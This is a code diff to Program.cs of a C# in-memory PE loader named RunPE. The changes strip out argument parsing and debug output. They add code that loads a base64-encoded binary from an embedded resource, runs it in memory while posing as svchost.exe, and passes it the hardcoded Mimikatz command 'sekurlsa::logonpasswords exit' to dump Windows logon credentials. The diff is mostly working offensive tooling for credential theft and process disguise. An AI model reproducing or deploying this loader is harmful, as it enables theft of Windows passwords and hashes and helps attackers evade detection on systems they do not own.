@@ -1,47 +1,32 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Text;
-using System.Linq;
 using RunPE.Internals;
 using RunPE.Patchers;
+using System.Reflection;
+using System.Linq;
 
 namespace RunPE
 {
-    internal static class Program
+    public class Program
     {
         private const uint EXECUTION_TIMEOUT = 30000;
 
         internal static Encoding encoding;
 
-        private static int Main(string[] args)
+        public static int Main(string[] args)
         {
-
-#if BREAK
-            Console.WriteLine("[*] Press Enter to continue...");
-            Console.ReadLine();
-            Console.WriteLine("[*] Continuing...");
-#endif
-
             try
             {
-                if (IntPtr.Size != 8)
-                {
-                    Console.WriteLine("\n[-] Process is not 64-bit, this version of run-exe won't work !\n");
-                    return -1;
-                } else
+                string[] command = new string[] { "sekurlsa::logonpasswords exit" };
+                // Replace or adjust this part to read from resources
+                var peRunDetails = GetPeRunDetailsFromResources(command);
 
-                if (args.Length == 0)
-                {
-                    PrintUsage();
-                    return -2;
-                }
+                var argumentHandler = new ArgumentHandler();
 
-                var peRunDetails = ParseArgs(args.ToList());
-
-                if(peRunDetails == null)
+                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.arguments))
                 {
-                    return -10;
+                    return -3;
                 }
 
                 var peMapper = new PEMapper();
@@ -52,11 +37,6 @@ namespace RunPE
 
                 peMapper.SetPagePermissions();
 
-                var argumentHandler = new ArgumentHandler();
-                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
-                {
-                    return -3;
-                }
 
                 var fileDescriptorRedirector = new FileDescriptorRedirector();
                 if (!fileDescriptorRedirector.RedirectFileDescriptors())
@@ -75,7 +55,7 @@ namespace RunPE
                 {
                     return -9;
                 }
-                
+
                 var exitPatcher = new ExitPatcher();
                 if (!exitPatcher.PatchExit())
                 {
@@ -84,15 +64,7 @@ namespace RunPE
 
                 fileDescriptorRedirector.StartReadFromPipe();
 
-#if BREAK
-                Console.WriteLine("Press Enter to continue...");
-                Console.ReadLine();
-#endif
-                StartExecution(peRunDetails.args, pe, currentBase);
-#if BREAK
-                Console.WriteLine("Done, press enter...");
-                Console.ReadLine();
-#endif
+                StartExecution(peRunDetails.arguments, pe, currentBase);
 
                 // Revert changes
                 exitPatcher.ResetExitFunctions();
@@ -106,18 +78,9 @@ namespace RunPE
                 // Print the output
                 var output = fileDescriptorRedirector.ReadDescriptorOutput();
 
-#if DEBUG
-                Console.WriteLine("\n------------------------ EXE OUTPUT -------------------------\n");
-#endif
+
                 Console.WriteLine(output);
-#if DEBUG
-                Console.WriteLine("\n--------------------- END OF EXE OUTPUT ---------------------\n");
-                Console.WriteLine("[+] End of RunPE\n");
-#endif
-#if BREAK
-                Console.WriteLine("Press Enter to quit\n");
-                Console.ReadLine();
-#endif
+
                 return 0;
             }
             catch (Exception e)
@@ -130,9 +93,6 @@ namespace RunPE
         private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
         {
 
-#if DEBUG
-            Console.WriteLine($"\n[*] Executing loaded PE\n");
-#endif
             try
             {
                 var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
@@ -146,63 +106,45 @@ namespace RunPE
             }
 
         }
-
-        private static PeRunDetails ParseArgs(List<string> args)
-        {
-            string filename;
-            string[] binaryArgs;
-            byte[] binaryBytes;
-
-            if(args.Contains("---f") || args.Contains("---b"))
-            {
-                if(!(args.Contains("---f") && args.Contains("---b")))
-                {
-                    PrintUsage();
-                    return null;
-                }
-
-                filename = args[args.IndexOf("---f") + 1];
-                if (args.Contains("---a")) {
-                    binaryArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[args.IndexOf("---a") + 1])).Split();
-                } else
-                {
-                    binaryArgs = new string[] { };
-                }
-                
-                binaryBytes = Convert.FromBase64String(args[args.IndexOf("---b") + 1]);
-#if DEBUG
-                Console.WriteLine($"[*] Running base64 encoded binary as file {filename} with args: '{string.Join(" ", binaryArgs)}'");
-#endif
-            }
-            else
-            {
-                filename = args[0];
-                binaryBytes = File.ReadAllBytes(filename);
-                if(args.Count > 1)
-                {
-                    binaryArgs = new string[args.Count - 1];
-                    Array.Copy(args.ToArray(), 1, binaryArgs, 0, args.Count - 1);
-    #if DEBUG
-                    Console.WriteLine($"[*] Running: {filename} with args: '{string.Join(" ", binaryArgs)}'");
-    #endif
-                }
-                else
-                {
-                    binaryArgs = new string[] { };
-    #if DEBUG
-                    Console.WriteLine($"[*] Running: {filename} with no args");
-    #endif
-                }
-            }
-            return new PeRunDetails { filename = filename, args = binaryArgs, binaryBytes = binaryBytes};
-        }
-
         private static void PrintUsage()
         {
-            Console.WriteLine($"Usage: RunPE.exe <file-to-run> <args-to-file-to-run>");
-            Console.WriteLine($"\te.g. RunPE.exe C:\\Windows\\System32\\net.exe localgroup administrators");
-            Console.WriteLine($"\nAlternative usage: RunPE.exe ---f <file-to-pretend-to-be> ---b <base64 blob of file bytes> ---a <base64 blob of args>");
-            Console.WriteLine($"\te.g: RunPE.exe ---f C:\\Windows\\System32\\svchost.exe ---b <net.exe, base64 encoded> ---a <localgroup administrators, base64 encoded>");
+            Console.WriteLine("Usage: RunPE.exe <args-to-file-to-run>");
+            Console.WriteLine("\te.g., RunPE.exe sekurlsa::logonpasswords");
+        }
+
+        private static PeRunDetails GetPeRunDetailsFromResources(string[] command)
+        {
+            string filename = ReadResourceText("file.txt");
+            byte[] binaryBytes = Convert.FromBase64String(filename); // Assuming file.txt contains base64 encoded binary
+            string impersonation = "C:\\Windows\\System32\\svchost.exe";
+
+            return new PeRunDetails { filename = impersonation, arguments = command, binaryBytes = binaryBytes };
+        }
+
+        private static string ReadResourceText(string resourceName)
+        {
+            // Get the current assembly through which this code is executed
+            var assembly = Assembly.GetExecutingAssembly();
+
+            // Find the resource name that ends with the specified file name, ignoring case
+            var fullResourceName = assembly.GetManifestResourceNames()
+                .FirstOrDefault(name => name.EndsWith(resourceName, StringComparison.OrdinalIgnoreCase));
+
+            if (string.IsNullOrEmpty(fullResourceName))
+            {
+                Console.WriteLine($"[-] Unable to find embedded resource: {resourceName}");
+                return null;
+            }
+
+            // Read the content of the resource
+            using (Stream stream = assembly.GetManifestResourceStream(fullResourceName))
+            {
+                if (stream == null) return null;
+                using (StreamReader reader = new StreamReader(stream))
+                {
+                    return reader.ReadToEnd();
+                }
+            }
         }
 
     }
@@ -210,7 +152,7 @@ namespace RunPE
     internal class PeRunDetails
     {
         internal string filename;
-        internal string[] args;
+        internal string[] arguments;
         internal byte[] binaryBytes;
     }
 
